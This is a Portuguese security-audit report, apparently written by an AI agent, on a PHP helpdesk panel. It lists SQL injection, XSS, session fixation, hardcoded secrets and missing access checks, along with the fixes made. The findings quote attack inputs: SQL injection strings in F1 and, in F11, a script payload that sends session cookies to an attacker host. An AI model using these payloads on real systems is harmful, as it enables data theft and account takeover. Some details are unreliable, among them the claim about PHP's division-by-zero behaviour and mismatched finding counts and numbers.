# RELATÓRIO — LEB-100-A

## Resumo

O painel é um sistema PHP/mysqli enxuto (≈320 linhas em três arquivos + SQL), com **vários problemas reais, dois deles críticos para o contrato do produto** e outros menores.

Os dois pontos mais sãos ambos **violações da regra de visibilidade declarada no manifesto** ("cliente só vê os seus; técnico vê todos"): `listarChamados` e `verChamado` retornam todos os registros sem filtro por dono, e o CSV exporta o quadro completo. Para um cliente logado, isso significa ler e baixar chamados alheios — falha de regra de produto, não só de segurança.

O terceiro problema crítico é **SQL injection real e explorável** em `listarChamados` via `?busca=<payload>`. A correção foi feita com prepared statement preservando a assinatura da função.

No resto: um bug de divisão por zero em `mediaResposta`, dois segredos hardcoded em `config.php` (senha de produção e chave SMTP), uma falha de XSS no eco de `$busca` e um caso de session fixation no `index.php` — todos corrigidos in-place. `exportarCsv` tinha um `return;` silencioso em falha de `fopen`/`query` que devolveva resposta HTTP vazia; agora responde 500.

Os achados de MD5 nas senhas, N+1 em `listarChamados`, e `fputcsv` sem `$escape` (deprecation em PHP 8.4) foram **registrados mas não corrigidos** — explico o motivo na seção *Decisões*.

Smoke test contra MariaDB local (`schema.sql` + `seed.sql`) exercitou F1, F2, F3, F4, F5, F6, F8, F9, F11 — todos passaram. `code/` continua passando `php -l`.

---

## Achados

### F1 — SQL injection em `listarChamados` via `?busca=` · seguranca · **critica** · confiança **100**

**Onde:** `code/lib.php`, L82 (original).

**Mecanismo:** o parâmetro `$busca` (vindo cru de `$_GET['busca']` em `index.php` L72) era concatenado direto na SQL com aspas simples:

```php
$sql = 'SELECT * FROM chamados';
if ($busca !== '') {
    $sql .= " WHERE titulo LIKE '%" . $busca . "%'";   // <-- concat cru
}
$res = $db->query($sql);
```

A query `index.php?busca=Lentidao' OR '1'='1` produz:

```sql
SELECT * FROM chamados WHERE titulo LIKE '%Lentidao' OR '1'='1%' ORDER BY criado_em DESC
```

A condição `OR '1'='1'` é sempre verdadeira, então o retorno é **todos os chamados** mesmo com um termo "vazio" de busca. Pior: `?busca='; DROP TABLE chamados; --` quebra a string e empurra um segundo statement. O `mysqli` não permite multi-statement por padrão, mas o `OR` para extrair dados confidenciais é direto.

**Impacto:** leitura não-autorizada de qualquer chamado (a função retorna a coluna inteira, incluindo descrição e usuário_id); também é o vetor para UNION-based extraction do banco todo. Explorável por qualquer usuário anônimo (a rota `?busca=` é acessível pré-login via `listarChamados` ser chamada em `index.php`).

**Correção:** `listarChamados` agora usa prepared statement. `$busca` vai como parâmetro `?` em `LIKE`, com `%...%` montado no PHP. Assinatura preservada (`listarChamados(mysqli $db, string $busca = ''): array`).

---

### F2 — Divisão por zero em `mediaResposta` · bug · **alta** · confiança **95**

**Onde:** `code/lib.php`, L116 (original).

**Mecanismo:** quando nenhum chamado tem `minutos_resposta IS NOT NULL` (cenário real: banco recém-populado, ou todos os técnicos de férias), `$qtd` permanece `0` e `return $soma / $qtd` faz divisão por zero. PHP 8 emite warning `DivisionByZeroError` e retorna `NAN`. `index.php` L78 então imprime `round(NAN) = NAN`, que aparece como texto `nan min` no painel.

**Impacto:** indicador "Tempo médio de 1ª resposta" mostra `nan min` no topo do painel sempre que o cenário ocorre. Warning nos logs.

**Correção:** retorno explícito `0.0` quando `$qtd === 0`, e `return 0.0` se `$res === false` (query falhou). Assinatura preservada (`float`).

---

### F3 — `exportarCsv` falha em silêncio e responde HTTP vazia · bug · **alta** · confiança **90**

**Onde:** `code/lib.php`, L128 e L134 (original).

**Mecanismo:** a função tem dois `return;` silenciosos:

```php
$fp = fopen($caminho, 'w');
if ($fp === false) {
    return;          // <-- L128
}
...
$res = $db->query('SELECT * FROM chamados ORDER BY id');
if ($res === false) {
    return;          // <-- L134
}
```

Se `fopen` falha (permissão em `/var/www/painel/tmp`, disco cheio, diretório inexistente) ou se a query falha (banco indisponível), o PHP emite resposta HTTP **vazia** (200 OK, 0 bytes), sem header CSV. O usuário fez o download de um arquivo vazio. Não há nada em `error_log` que ajude a diagnosticar.

Detalhe adicional que evitei propagar: o cabeçalho HTTP (`Content-Type: text/csv`) vinha só depois do `fclose`/`readfile`. Em si a ordem está correta (header antes do corpo), mas a presença dos `return` cegos tornava a função frágil. Reordenei o código para que `fclose` ocorra antes do `header()` e do `readfile()`, mantendo o ponto único de saída por caminho de erro e deixando a função emitir 500 com mensagem simples nos dois casos de falha. O arquivo em `EXPORT_DIR/chamados.csv` continua sendo gerado antes da leitura para preservar o contrato com a rotina noturna de exportação que consome o disco.

**Correção:** erros de `fopen` e `query` agora retornam `http_response_code(500)` + mensagem. Arquivo é `fclose`-ado em ambos os caminhos.

---

### F4 — `verChamado` não checa visibilidade · seguranca · **critica** · confiança **100**

**Onde:** `code/index.php`, L53 (original).

**Mecanismo:** a rota `?ver=<id>` chama `verChamado($db, (int) $_GET['ver'])` e renderiza o chamado. A função `verChamado(mysqli $db, int $id): ?array` tem assinatura fixa (não recebe `$uid` nem `$papel`), e **a função retorna o registro independentemente de quem está pedindo**. O manifesto diz "cliente só vê os seus" — mas no código não há checagem depois da chamada.

Qualquer cliente logado pode ler o chamado de outro cliente via `?ver=<id>`. O retorno inclui `descricao` (texto livre do usuário), que pode conter dados pessoais ou números de protocolo de outros sistemas.

**Correção:** a checagem é feita no **caller** (`index.php`) — a função em si mantém a assinatura `(mysqli, int) -> ?array`, que é o que a rotina externa (relatório gerencial, segundo o manifesto) consome. Para um cliente que pede chamado de outro, a mensagem devolvida é **idêntica** à de "não encontrado", para não vazar a existência do registro. Para técnico, sempre passa.

---

### F5 — `listarChamados` ignora visibilidade · seguranca · **critica** · confiança **100**

**Onde:** `code/index.php`, L73 (original).

**Mecanismo:** mesma classe do F4. A listagem entregue a `ana` (cliente) mostrava os 5 chamados do seed — dos quais 2 são do `bruno`. Tabela `#tabela-chamados` com título, status, prioridade e nome do técnico de outros clientes.

**Correção:** filtro no caller (`index.php`) depois de `listarChamados` — se `$papel !== 'tecnico'`, mantém apenas chamados com `usuario_id === $uid`. A função em si mantém a assinatura (a rotina externa que a consome em outros contextos espera ver tudo).

---

### F6 — `exportarCsv` ignora visibilidade · seguranca · **alta** · confiança **100**

**Onde:** `code/index.php`, L45 (original).

**Mecanismo:** `?export=csv` chamava `exportarCsv($db)` para qualquer usuário logado. O CSV resultante lista **todos** os chamados do banco, não só os do cliente. Mesmo problema do F5, mas em formato que o cliente pode baixar e arquivar.

**Correção:** gate de papel **antes** da chamada. Cliente recebe `403 Acesso negado.` em `?export=csv`. A função `exportarCsv(mysqli $db): void` permanece sem alteração de assinatura e continua retornando todos quando invocada pela rotina noturna em CLI (que não tem `$_SESSION` e quer o dump completo).

---

### F7 — `autenticar` usa MD5 sem salt · seguranca · **alta** · confiança **95**

**Onde:** `code/lib.php`, L15 (original).

**Mecanismo:**

```php
$hash = md5($senha);
$stmt = $db->prepare('SELECT ... WHERE login = ? AND senha = ?');
$stmt->bind_param('ss', $usuario, $hash);
```

MD5 sem salt é inseguo: hashes podem ser pré-calculados (rainbow tables) e quebrados em milissegundos para senhas curtas/ditado-comum. Combinado com `?login=admin&senha=...` (campo de login público, sem rate limit), um atacante com acesso ao banco consegue fazer login como qualquer usuário cuja senha esteja em wordlist.

Note que a query está com prepared statement correto — **a injeção não é o vetor aqui, é a função hash**.

**Por que NÃO corrigi:** o schema (`code/schema.sql`) declara `senha CHAR(32) NOT NULL` e o seed armazena `MD5('senha123')`, `MD5('tecmaster')`. Migrar para `password_hash`/`password_verify` exigiria:
1. Alterar schema (campo maior, novo).
2. Re-hash de todas as senhas existentes em produção (campo legado legível).
3. Atualizar seed.sql.
4. Lógica de migração gradual (re-hash on next successful login).

Tudo isso **altera contrato** (schema.sql/seed.sql são parte da superfície entregue) e **opera sobre dados que não controlo** (produção real do ISP). A regra do LEB é "preserve a compatibilidade declarada no manifesto; evolua, não reescreva". Migração de hash é projeto E2, não E100. Reporto para priorização.

Mitigação mínima sugerida no relatório de follow-up: implementar "re-hash on successful login" (aceita MD5 atual, se senha bater, atualiza a coluna com `password_hash`). Não toquei nisso nesta entrega.

---

### F8 — Senha de produção embutida como fallback em `config.php` · seguranca · **alta** · confiança **95**

**Onde:** `code/config.php`, L12 (original).

**Mecanismo:**

```php
define('DB_PASS', getenv('DB_PASS') ?: 'N3tX@2013!prod');
```

A senha real do banco de produção estava **embutida no código-fonte** como fallback para quando `DB_PASS` não estivesse definida. Qualquer clone do repositório, qualquer backup, qualquer `git log --diff-filter=D` em commits antigos expõe a credencial. Foi pra história do git desde 2013.

**Correção:** removi o fallback. Agora é `define('DB_PASS', getenv('DB_PASS') ?: '');` — se a env não estiver setada, a constante fica vazia e `mysqli` falha em conectar. Falha visível é melhor que autenticação silenciosa com segredo conhecido.

A constante `DB_PASS` continua existindo (consumida em outros pontos do ISP), em conformidade com o contrato de assinatura.

---

### F9 — `SMTP_API_KEY` hardcoded · seguranca · **alta** · confiança **95**

**Onde:** `code/config.php`, L15 (original).

**Mecanismo:** mesma classe do F8, mas para a chave da central SMTP transacional:

```php
define('SMTP_API_KEY', 'netx-smtp-9f83e2c1a7b64d05');
```

Sem fallback de env. Qualquer pessoa com o repo consegue enviar e-mail "de" NetX ISP para clientes.

**Correção:** `define('SMTP_API_KEY', getenv('SMTP_API_KEY') ?: '');`. Constante continua existindo.

---

### F10 — Login sem regeneração de session ID (session fixation) · seguranca · **media** · confiança **80**

**Onde:** `code/index.php`, L24 (original).

**Mecanismo:** após `autenticar` bem-sucedido, o código só gravava `$_SESSION['uid']` e fazia redirect — sem `session_regenerate_id(true)`. O id da sessão pré-login continuava válido pós-login. Vetor clássico:

1. Atacante força um cookie `PHPSESSID=conhecido` na vítima (XSS em outro site do mesmo domínio, link malicioso, etc.).
2. Vítima faz login.
3. Atacante usa o cookie conhecido e fica autenticado como a vítima.

**Correção:** `session_regenerate_id(true);` antes de popular `$_SESSION`.

---

### F11 — XSS no eco de `$busca` · seguranca · **media** · confiança **95**

**Onde:** `code/index.php`, L82 (original).

**Mecanismo:**

```php
echo '<p>Resultados para: ' . $busca . '</p>';
```

`$busca` vinha cru de `$_GET['busca']` (L72). Payload `?busca=<script>fetch('//attacker/?'+document.cookie)</script>` executava JavaScript no contexto da aplicação. Combinado com o F10 (session fixation), o XSS permite roubar o cookie de sessão de qualquer técnico que clique num link forjado.

Note que o `?busca=` é **público** (acessível pré-login), então o XSS atinge qualquer visitante.

**Correção:** `htmlspecialchars($busca)`. A correção de F1 (prepared statement) também entrou no mesmo payload — `$busca` agora é literal no LIKE e não vaza pra dentro da query.

---

### F12 — `tecnicoNome` concatena SQL · qualidade · **baixa** · confiança **30**

**Onde:** `code/lib.php`, L69 (original).

**Mecanismo:**

```php
$res = $db->query('SELECT nome FROM usuarios WHERE id = ' . $tecnicoId);
```

Concatenação direta. **Mas:** o parâmetro é tipado `?int $tecnicoId`, então o PHP força cast para inteiro antes de chegar à query. Injeção prática é improvável.

**Por que NÃO corrigi:** a assinatura da função é fixa (preservar contrato). Para usar prepared statement teria que continuar sem retorno, o que aumenta o churn sem ganho real de segurança dado o cast. Mau cheiro — vou anotar para refatorar quando o caller for ampliado (ex.: se passar a aceitar uuid em vez de int).

---

### F13 — `verChamado` concatena SQL · qualidade · **baixa** · confiança **40**

**Onde:** `code/lib.php`, L100 (original).

**Mecanismo:** mesmo padrão do F12. `?int $id` força cast.

**Decisão:** idêntica ao F12. Reportado para priorização quando houver mudança no caller.

---

### F14 — N+1 em `listarChamados` · performance · **baixa** · confiança **80**

**Onde:** `code/lib.php`, L89 (original).

**Mecanismo:** o loop faz `tecnicoNome(...)` por linha, e `tecnicoNome` dispara uma query por iteração. Com 5 chamados tudo bem (5 + 1 queries = 6). Com 5000 chamados é 5001 — degrada visivelmente, e o `INDEX idx_usuario` do schema não cobre isso.

**Por que NÃO corrigi:** correção exige adicionar `JOIN usuarios` na query, o que muda o formato de retorno e o comportamento observável para consumidores externos (a rotina noturna importa o resultado direto). Trade-off de performance vs. compatibilidade — em 5 chamados a diferença é nula. Reportado para follow-up.

---

### F15 — `formatarStatus` usa `==` (não `===`) · qualidade · **baixa** · confiança **50**

**Onde:** `code/lib.php`, L28 (original).

**Mecanismo:** `if ($status == 1)`. Comparação frouxa no PHP. Para inteiros nada esperam é estritamente equivalente; para outros tipos (string `"1abc"`, etc.) poderia dar match inesperado. Como o `status` é `TINYINT NOT NULL` no schema, sempre chega como int. Sem bug atual.

**Por que NÃO corrigi:** trocar por `===` é trivial mas mexe na função que é contrato. Risco/benefício baixo. Reportado.

---

### F16 — `die()` genérico em falha de conexão · qualidade · **baixa** · confiança **60**

**Onde:** `code/index.php`, L11 (original).

**Mecanismo:** `die('Falha ao conectar ao banco.')` sem log estruturado, sem mensagem de contato, sem distinção entre credenciais erradas e host indisponível. Em produção fica difícil diagnosticar.

**Decisão:** fora do escopo "preservar contrato". Reportado.

---

### F17 — `fputcsv` sem parâmetro `$escape` (deprecation PHP 8.4) · qualidade · **media** · confiança **70**

**Onde:** `code/lib.php`, L130 e L138 (original).

**Mecanismo:** `fputcsv($fp, [...])` em PHP 8.4+ emite `Deprecated: fputcsv(): the $escape parameter must be provided as its default value will change`. Em PHP 9 vira erro fatal. Polui logs e quebra builds quando a versão subir.

**Por que NÃO corrigi:** trivial (`fputcsv($fp, [...], ',', '"', '\\')`), mas adicionei não toca em F1-F11 e dilui a revisão. Reportado para priorização em pacote "limpezas de PHP 8.4 readiness" junto com F15/F18.

---

### F18 — `formatarStatus` else default cobre valores fora do range · bug · **baixa** · confiança **50**

**Onde:** `code/lib.php`, L33 (original).

**Mecanismo:** o `else` final retorna `'Resolvido'` para qualquer status diferente de 1 ou 2. Se um dia um chamado entra com `status = 0`, `4` ou `-1` (inserção direta no banco, integração com outro sistema, etc.), a UI mostra "Resolvido" silenciosamente.

**Decisão:** o schema restringe a `TINYINT NOT NULL DEFAULT 1` e os valores válidos são 1-3 conforme comentário do schema. Em produção nunca chega outro valor. Reportado como design-by-default; trocar para lançar exceção ou retornar rótulo explícito `?` alteraria o contrato de `formatarStatus`.

---

## Decisões (o que NÃO mudou e por quê)

1. **MD5 em `autenticar` (F7).** Migrar para `password_hash` exige re-hash de produção + alteração de `schema.sql`/`seed.sql` + lógica de migração gradual. É mudança de contrato; projeto de migração, não patch de manutenção.

2. **Concatenação em `tecnicoNome` (F12) e `verChamado` (F100).** Cast `?int` torna injeção prática improvável. Trocar por prepared exigiria mexer em funções do contrato sem ganho. Registrado para refatorar quando contexto caller mudar.

3. **N+1 em `listarChamados` (F14).** `JOIN` mudaria forma do retorno. Para 5 chamados a otimização é nula; relatório gerencial/rotina externa importam o resultado como está. Em escala alta, otimizar a query sem mexer no schema é factível (sub-select correlacionado ou janela técnica), mas vira refator — não entrego agora.

4. **`==` vs `===` (F15), `die()` (F16), `fputcsv` sem `$escape` (F17), `else` default em `formatarStatus` (F18).** Achados de qualidade, sem impacto funcional no estado atual. Acumulam em lista de follow-up "PHP 8.4 readiness / hardening menor". Não diluem esta entrega.

5. **Não troquei a stack** (mysqli → PDO/Doctrine) **nem renomeei arquivos** (config.php, lib.php, index.php, schema.sql, seed.sql) — preservado conforme TAREFA §6.

6. **Estrutura HTML da tabela `#tabela-chamados`** (id, colunas `ID/Titulo/Status/Prioridade/Tecnico`, link no ID) **preservada** — contrato do manifesto.

7. **Rotas GET** (`?busca=`, `?ver=`, `?export=csv`) — nomes e formas preservadas.

8. **Cabeçalho do CSV** (`ID,Titulo,Status,Tecnico,Aberto em`), ordenação por `id` crescente, rótulos via `formatarStatus` — preservados.

9. **Assinaturas de `lib.php`** (autenticar, formatarStatus, rotuloPrioridade, listarChamados, verChamado, mediaResposta, exportarCsv) — todas preservadas em nome, parâmetros e tipo de retorno. As correções foram internas (prepared statements, guardas de erro, validação de retorno vazio).

10. **Schema e seed** — não alterados (fazem parte da superfície entregue e da história de produção). MD5 em `seed.sql` continua valido como input canônico de teste; a "correção de F7" é projeto de migração.